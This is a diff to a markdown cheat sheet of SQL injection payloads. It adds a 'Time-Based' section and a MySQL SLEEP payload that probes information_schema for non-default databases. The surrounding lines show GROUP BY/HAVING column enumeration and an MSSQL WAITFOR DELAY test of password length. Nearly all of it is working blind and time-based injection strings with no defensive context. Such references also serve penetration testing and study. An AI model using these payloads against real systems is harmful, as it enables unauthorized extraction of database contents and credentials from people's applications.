@@ -17,6 +17,8 @@ Find columns names
 ' GROUP BY table.column1, column2, column3(n) HAVING 1=1 -- and so on
 ```
 
+Time-Based 
+
 Use the waiting time to determine whether the conditional equation is valid
 
 ```SQL
@@ -31,6 +33,20 @@ Use the waiting time to determine whether the conditional equation is valid
 ```SQL
 -- check column length
 '; IF (select LEN(password) from users) = 64 WAITFOR DELAY '00:00:05' --
+```
+
+single column condition test
+
+```SQL
+/* 
+    Check if there are uncommon [mysql] db names
+    if found, wait N seconds
+    ='1'...= '2'... and so on
+*/
+SELECT 'y' 
+WHERE 1=0 or 
+SLEEP(IF((SELECT COUNT(*) FROM information_schema.schemata 
+WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema'))='1', 5, 0)); 
 ```
 
 ### :open_file_folder: MySQL
